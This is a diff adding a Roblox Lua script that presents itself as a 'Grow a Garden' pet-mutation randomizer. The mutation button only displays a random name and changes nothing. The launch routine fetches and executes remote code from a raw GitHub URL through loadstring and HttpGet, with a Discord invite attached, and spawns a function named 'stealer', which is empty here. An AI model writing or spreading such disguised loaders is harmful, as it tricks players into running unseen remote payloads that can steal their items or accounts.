@@ -1,0 +1,112 @@
+-- 🌑 Grow a Garden Script v011 (Final Version)
+
+-- Clean previous GUIs
+for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
+	if gui.Name == "growagarden011" or gui.Name == "growagardenscripter" then
+		gui:Destroy()
+	end
+end
+
+-- 🧛‍♂️ Loading Screen
+local function showLoading()
+	local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+	gui.IgnoreGuiInset = true
+	gui.Name = "growagardenscripter"
+
+	local label = Instance.new("TextLabel", gui)
+	label.Size = UDim2.new(1, 0, 1, 0)
+	label.BackgroundTransparency = 1
+	label.Text = "☠ growagardenscripter ☠"
+	label.TextColor3 = Color3.fromRGB(255, 0, 0)
+	label.TextStrokeColor3 = Color3.new(0, 0, 0)
+	label.TextStrokeTransparency = 0.2
+	label.Font = Enum.Font.Arcade
+	label.TextScaled = true
+
+	task.delay(3, function()
+		gui:Destroy()
+	end)
+end
+
+-- 🌿 Main GUI
+local function createMainGUI()
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "growagarden011"
+	screenGui.ResetOnSpawn = false
+	screenGui.IgnoreGuiInset = true
+	screenGui.Parent = game:GetService("CoreGui")
+
+	-- Mutation Randomizer Button
+	local mutateButton = Instance.new("TextButton", screenGui)
+	mutateButton.Size = UDim2.new(0, 240, 0, 50)
+	mutateButton.Position = UDim2.new(0.5, -120, 0.85, 0)
+	mutateButton.Text = "🔁 Randomize Pet Mutation"
+	mutateButton.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+	mutateButton.TextColor3 = Color3.new(1, 1, 1)
+	mutateButton.Font = Enum.Font.GothamBold
+	mutateButton.TextScaled = true
+
+	-- 3D popup label
+	local function show3DLabel(text)
+		for _, obj in pairs(workspace:GetDescendants()) do
+			if obj:IsA("BasePart") and obj.Name:lower():find("machine") then
+				local popup = Instance.new("BillboardGui", obj)
+				popup.Adornee = obj
+				popup.Size = UDim2.new(0, 200, 0, 50)
+				popup.StudsOffset = Vector3.new(0, 4, 0)
+				popup.AlwaysOnTop = true
+
+				local label = Instance.new("TextLabel", popup)
+				label.Size = UDim2.new(1, 0, 1, 0)
+				label.BackgroundTransparency = 1
+				label.Text = "✨ " .. text .. " ✨"
+				label.TextColor3 = Color3.fromRGB(255, 255, 255)
+				label.TextStrokeTransparency = 0.2
+				label.TextStrokeColor3 = Color3.new(0, 0, 0)
+				label.Font = Enum.Font.GothamBold
+				label.TextScaled = true
+
+				task.delay(3, function()
+					popup:Destroy()
+				end)
+				break
+			end
+		end
+	end
+
+	local mutations = {
+		"Shiny", "Inverted", "Windy", "Frozen", "Golden", "Tiny",
+		"Mega", "Tranquil", "Corrupted", "IronSkin", "Radiant",
+		"Shocked", "Rainbow", "Ascended"
+	}
+
+	mutateButton.MouseButton1Click:Connect(function()
+		local picked = mutations[math.random(1, #mutations)]
+		show3DLabel(picked)
+	end)
+
+	-- Rename all "Project Reverse"
+	for _, obj in ipairs(screenGui:GetDescendants()) do
+		if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text then
+			obj.Text = obj.Text:gsub("Project Reverse", "growagardenscript011")
+		end
+	end
+end
+
+-- 🧠 Load external UI script (from your link)
+local function loadui()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+end
+
+-- ⚠️ Your custom function — be sure you trust what "stealer" does
+local function stealer()
+	-- You must define what this does, or remove it if unsure.
+end
+
+-- 🚀 Launch
+showLoading()
+task.delay(3.5, function()
+	createMainGUI()
+	task.spawn(stealer)
+	task.spawn(loadui)
+end)
